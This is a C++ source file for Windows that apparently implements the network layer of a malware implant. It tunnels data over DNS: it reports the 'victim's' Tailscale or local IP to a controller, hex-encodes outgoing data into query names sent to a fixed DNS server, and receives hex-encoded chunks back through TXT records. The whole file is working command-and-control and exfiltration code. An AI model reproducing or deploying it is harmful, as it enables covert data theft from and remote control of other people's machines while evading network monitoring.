#define WIN32_LEAN_AND_MEAN
#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include "Network.h"
#include <string>
#include <sstream>
#include <iomanip>
#include <vector>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windns.h>
#include <iphlpapi.h>

#ifdef _DEBUG
#include <iostream>
#endif

#pragma comment(lib, "Dnsapi.lib") 
#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "IPHLPAPI.lib")

// Get Tailscale IP (100.x.x.x) or fallback to any non-loopback IP
std::string getLocalTailscaleIP() {
	PIP_ADAPTER_ADDRESSES pAddresses = nullptr;
	ULONG outBufLen = 15000;
	
	pAddresses = static_cast<PIP_ADAPTER_ADDRESSES>(malloc(outBufLen));
	if (!pAddresses) {
		return "0.0.0.0";
	}

	DWORD dwRetVal = GetAdaptersAddresses(AF_INET, GAA_FLAG_INCLUDE_PREFIX, nullptr, pAddresses, &outBufLen);
	
	if (dwRetVal == NO_ERROR) {
		PIP_ADAPTER_ADDRESSES pCurr = pAddresses;
		std::string firstNonLoopback = "";
		
		while (pCurr) {
			PIP_ADAPTER_UNICAST_ADDRESS pUnicast = pCurr->FirstUnicastAddress;
			while (pUnicast) {
				if (pUnicast->Address.lpSockaddr->sa_family == AF_INET) {
					sockaddr_in* sa_in = reinterpret_cast<sockaddr_in*>(pUnicast->Address.lpSockaddr);
					char ip[INET_ADDRSTRLEN];
					inet_ntop(AF_INET, &(sa_in->sin_addr), ip, INET_ADDRSTRLEN);
					std::string ipStr(ip);
					
					// Priority 1: Tailscale IP (100.x.x.x)
					if (ipStr.substr(0, 4) == "100.") {
						free(pAddresses);
						return ipStr;
					}
					
					// Save first non-loopback IP as fallback
					if (firstNonLoopback.empty() && ipStr.substr(0, 4) != "127.") {
						firstNonLoopback = ipStr;
					}
				}
				pUnicast = pUnicast->Next;
			}
			pCurr = pCurr->Next;
		}
		
		// Fallback: Return any non-loopback IP
		if (!firstNonLoopback.empty()) {
			free(pAddresses);
			return firstNonLoopback;
		}
	}
	
	free(pAddresses);
	return "0.0.0.0";
}

int startConnection(const char* domain) {
	if (!domain) {
		#ifdef _DEBUG
		std::cout << "[startConnection] ERROR: domain is null" << std::endl;
		#endif
		return -1;
	}

	// Get victim's Tailscale IP (or fallback to any non-loopback IP)
	std::string victimIP = getLocalTailscaleIP();
	
	// Format: a.[IP].domain.com (e.g., a.100.50.50.50.example.com)
	std::string fullString = "a.";
	fullString += victimIP;
	fullString += ".";
	fullString += domain;
	const char* pOwnerName = fullString.c_str();
	
	#ifdef _DEBUG
	std::cout << "[startConnection] Query: " << fullString << std::endl;
	#endif
	
	WORD wType = DNS_TYPE_A;
	PDNS_RECORD pDnsRecord = nullptr;
	

	PIP4_ARRAY pSrvList = static_cast<PIP4_ARRAY>(LocalAlloc(LPTR, sizeof(IP4_ARRAY)));
	if (!pSrvList) {
		#ifdef _DEBUG
		std::cout << "[startConnection] ERROR: Failed to allocate pSrvList" << std::endl;
		#endif
		return -1;
	}

	pSrvList->AddrCount = 1;
	pSrvList->AddrArray[0] = inet_addr(DNS_SERVER_IP);
	
	#ifdef _DEBUG
	std::cout << "[startConnection] Sending DNS query to " << DNS_SERVER_IP << "..." << std::endl;
	#endif
	
	DNS_STATUS status;
	{
		std::lock_guard<std::mutex> lock(g_dnsSendMutex);
		status = DnsQuery_A(
			pOwnerName,
			wType,
			DNS_OPTIONS,
			pSrvList,
			&pDnsRecord,
			nullptr
		);
	}
	
	LocalFree(pSrvList);
	
	#ifdef _DEBUG
	std::cout << "[startConnection] DNS query status: " << status << std::endl;
	#endif
	
	if (status) {
		#ifdef _DEBUG
		std::cout << "[startConnection] ERROR: DnsQuery_A failed with status " << status << std::endl;
		#endif
		return -1;
	}
	
	if (!pDnsRecord) {
		#ifdef _DEBUG
		std::cout << "[startConnection] ERROR: pDnsRecord is null" << std::endl;
		#endif
		return -1;
	}
	
	IN_ADDR ipaddr;
	ipaddr.S_un.S_addr = pDnsRecord->Data.A.IpAddress;
	std::string ipStr = inet_ntoa(ipaddr);
	
	#ifdef _DEBUG
	std::cout << "[startConnection] Received IP response: " << ipStr << std::endl;
	#endif
	
	DnsRecordListFree(pDnsRecord, DnsFreeRecordList);
	
	size_t lastDot = ipStr.rfind(".");
	if (lastDot == std::string::npos) {
		#ifdef _DEBUG
		std::cout << "[startConnection] ERROR: Invalid IP format, no dot found" << std::endl;
		#endif
		return -1;
	}
	
	int connectionId = std::stoi(ipStr.substr(lastDot + 1));
	
	#ifdef _DEBUG
	std::cout << "[startConnection] SUCCESS: Connection ID = " << connectionId << std::endl;
	#endif
	
	return connectionId;
}


int sendData(int& id, int& packetNumber, const char* domain, const char* data) {
	if (!domain || !data) {
		return -1;
	}

	std::ostringstream fullStream;
	fullStream << "b." << packetNumber << "." << id << "." << convertToHex(data) << "." << domain;
	std::string full = fullStream.str();
	const char* pOwnerName = full.c_str();
	
	WORD wType = DNS_TYPE_A;
	PDNS_RECORD pDnsRecord = nullptr;
	
	PIP4_ARRAY pSrvList = static_cast<PIP4_ARRAY>(LocalAlloc(LPTR, sizeof(IP4_ARRAY)));
	if (!pSrvList) {
		return -1;
	}

	pSrvList->AddrCount = 1;
	pSrvList->AddrArray[0] = inet_addr(DNS_SERVER_IP);
	
	DNS_STATUS status;
	int retCode = -1;
	
	for (int i = 0; i < 3; i++) {
		pDnsRecord = nullptr;
		
		status = DnsQuery_A(
			pOwnerName,
			wType,
			DNS_OPTIONS,
			pSrvList,
			&pDnsRecord,
			nullptr
		);
		
		
		if (!status && pDnsRecord) {
			IN_ADDR ipaddr;
			ipaddr.S_un.S_addr = pDnsRecord->Data.A.IpAddress;
			std::string ipStr = inet_ntoa(ipaddr);
			DnsRecordListFree(pDnsRecord, DnsFreeRecordList);
			
			size_t firstDot = ipStr.find(".");
			if (firstDot == std::string::npos) {
				goto cleanup;
			}
			
			int code = std::stoi(ipStr.substr(0, firstDot));
			
			switch (code) {
				case 200:  
					retCode = 0;
					goto cleanup;
					
				case 201:  
					break;
					
				case 202: 
					{
						int new_id = startConnection(domain);
						if (new_id != -1) {
							id = new_id;
						}
					}
					i--;  
					break;
					
				case 203:  
					packetNumber = 0;
					i--;  
					break;
					
				case 204: 
					goto cleanup;
					
				default:
					goto cleanup;
			}
		}
		
		Sleep(200); 
	}
	
cleanup:
	if (pSrvList) {
		LocalFree(pSrvList);
	}
	return retCode;
}

int sendDataTypeC(int& id, int& packetNumber, size_t& offset, const char* domain, const char* data) {
	if (!domain || !data) {
		return -1;
	}

	std::ostringstream fullStream;
	fullStream << "c." << packetNumber << "." << offset << "." << id << "." << data << "." << domain;
	std::string full = fullStream.str();
	const char* pOwnerName = full.c_str();
	
	WORD wType = DNS_TYPE_A;
	PDNS_RECORD pDnsRecord = nullptr;
	
	PIP4_ARRAY pSrvList = static_cast<PIP4_ARRAY>(LocalAlloc(LPTR, sizeof(IP4_ARRAY)));
	if (!pSrvList) {
		return -1;
	}

	pSrvList->AddrCount = 1;
	pSrvList->AddrArray[0] = inet_addr(DNS_SERVER_IP);
	
	DNS_STATUS status;
	int retCode = -1;
	
	for (int i = 0; i < 3; i++) {
		pDnsRecord = nullptr;
		
		{
			std::lock_guard<std::mutex> lock(g_dnsSendMutex);
			status = DnsQuery_A(
				pOwnerName,
				wType,
				DNS_OPTIONS,
				pSrvList,
				&pDnsRecord,
				nullptr
			);
		}
		
		
		if (!status && pDnsRecord) {
			IN_ADDR ipaddr;
			ipaddr.S_un.S_addr = pDnsRecord->Data.A.IpAddress;
			std::string ipStr = inet_ntoa(ipaddr);
			DnsRecordListFree(pDnsRecord, DnsFreeRecordList);
			
			size_t firstDot = ipStr.find(".");
			if (firstDot == std::string::npos) {
				goto cleanup;
			}
			
			int code = std::stoi(ipStr.substr(0, firstDot));
			
			switch (code) {
			case 200:
				retCode = 0;
				goto cleanup;
					
			case 201:  
				break;
					
			case 202: 
				{
					int new_id = startConnection(domain);
					if (new_id != -1) {
						id = new_id;
					}
				}
				i--;  
				break;
					
			case 203:  
				packetNumber = 0;
				i--;  
				break;
					
			case 204: 
				goto cleanup;
					
			default:
					goto cleanup;
			}
		}
		
		Sleep(200);
	}
	cleanup:
		if (pSrvList) {
			LocalFree(pSrvList);
		}
	return retCode;
}

int sendDataTypeP(int& id, int& packetNumber, size_t& offset, const char* domain)
{
	if (!domain) {
		return -1;
	}

	std::ostringstream fullStream;
	fullStream << "p." << packetNumber << "." << offset << "." << id << "." << domain;
	std::string full = fullStream.str();
	const char* pOwnerName = full.c_str();
	
	WORD wType = DNS_TYPE_TEXT; // DNS TXT record type
	PDNS_RECORD pDnsRecord = nullptr;
	
	PIP4_ARRAY pSrvList = static_cast<PIP4_ARRAY>(LocalAlloc(LPTR, sizeof(IP4_ARRAY)));
	if (!pSrvList) {
		return -1;
	}

	pSrvList->AddrCount = 1;
	pSrvList->AddrArray[0] = inet_addr(DNS_SERVER_IP);
	
	DNS_STATUS status;
	int retCode = -1;
	
	for (int i = 0; i < 3; i++) {
		pDnsRecord = nullptr;
		
		{
			std::lock_guard<std::mutex> lock(g_dnsSendMutex);
			status = DnsQuery_A(
				pOwnerName,
				wType,
				DNS_OPTIONS,
				pSrvList,
				&pDnsRecord,
				nullptr
			);
		}
		
		
		if (status == ERROR_SUCCESS && pDnsRecord) {

            if (pDnsRecord->wType == DNS_TYPE_TEXT &&
                pDnsRecord->Data.TXT.dwStringCount > 0)
            {
                std::wstring txtWide = pDnsRecord->Data.TXT.pStringArray[0];

                // TXT rong => het chunk de gui
                if (txtWide.empty()) {
                    retCode = 0;
                    DnsRecordListFree(pDnsRecord, DnsFreeRecordList);
                    goto cleanup;
                }

                // Windows DNS API pack 2 ASCII char vao moi wchar_t (little-endian)
                // Tach ca low byte va high byte tu moi wchar_t
                std::string hexStr;
                hexStr.reserve(txtWide.length() * 2);
                for (wchar_t wc : txtWide) {
                    // Each wchar_t contains 2 bytes: low byte first, then high byte
                    char lowByte = static_cast<char>(wc & 0xFF);
                    char highByte = static_cast<char>((wc >> 8) & 0xFF);
                    
                    if (lowByte != 0) hexStr += lowByte;
                    if (highByte != 0) hexStr += highByte;
                }
                
                // Decode hex to bytes
                std::string decodedChunk;
                for (size_t i = 0; i < hexStr.length(); i += 2) {
                    if (i + 1 < hexStr.length()) {
                        std::string byteStr = hexStr.substr(i, 2);
                        char byte = static_cast<char>(std::stoi(byteStr, nullptr, 16));
                        decodedChunk += byte;
                    }
                }
                
                // Convert decoded UTF-8 bytes to wstring for g_outChunk
                int wlen = MultiByteToWideChar(CP_UTF8, 0, decodedChunk.c_str(), -1, nullptr, 0);
                if (wlen > 0) {
                    std::wstring wbuf(wlen - 1, 0);
                    MultiByteToWideChar(CP_UTF8, 0, decodedChunk.c_str(), -1, &wbuf[0], wlen);
                    
                    std::lock_guard<std::mutex> lock(g_outChunkMutex);
                    g_outChunk = wbuf;
                }

                retCode = 1; // Có chunk
                DnsRecordListFree(pDnsRecord, DnsFreeRecordList);
                goto cleanup;
            }

            DnsRecordListFree(pDnsRecord, DnsFreeRecordList);
        }
		
		Sleep(200); 
	}
	
	cleanup:
		if (pSrvList) {
			LocalFree(pSrvList);
		}
	return retCode;
}


std::string convertToHex(const char* string) {
	if (!string) {
		return "";
	}

	std::ostringstream out;
	out << std::hex << std::setfill('0');
	
	for (const char* i = string; *i; i++) {
		out << std::setw(2) << static_cast<unsigned>(static_cast<unsigned char>(*i));
	}
	
	return out.str();
}